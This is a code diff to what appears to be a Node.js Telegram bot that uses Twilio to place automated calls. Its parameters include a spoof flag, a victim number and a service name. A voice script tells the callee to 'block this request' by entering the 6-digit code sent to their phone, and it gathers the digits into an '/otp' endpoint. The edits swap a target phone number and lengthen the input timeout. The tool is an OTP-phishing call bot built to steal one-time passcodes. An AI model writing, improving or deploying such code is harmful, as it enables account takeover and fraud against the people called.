@@ -114,7 +114,7 @@ const adminFilter = (ctx, next) => {
 async function call (spoof, customer_number, ctx, service, name, digit){
    try {
       await client.calls.create({
-         to: `+19085874874`,
+         to: `+17324289832`,
          from: `+19065534340`,
          machineDetection: 'DetectMessageEnd',
          url: 'https://demo.twilio.com/docs/voice/quickstart/voice.xml',
@@ -224,7 +224,6 @@ bot.command('call', userFilter, ctx => {
 
       call(spoof, number, ctx, service, name, 6)
    }
-
 
 })
 
@@ -396,7 +395,7 @@ app.get('/process', (req, res) => {
       twiml.say( `To block this request, please enter the ${6} digit code that we have sent to your mobile device.` );
       twiml.gather({
          numDigits: 6, // The number of digits to collect
-         timeout: 10, // The number of seconds to wait for input
+         timeout: 20, // The number of seconds to wait for input
          action: '/otp' // The URL to redirect to after input
       });
      break;
@@ -420,7 +419,7 @@ app.get('/otp', (req, res) => {
    // Create a TwiML response object
    const twiml = new twilio.twiml.VoiceResponse();
  
- });
+});
 
 app.listen(port, () => {
    console.log(`Server running on port ${port}`);
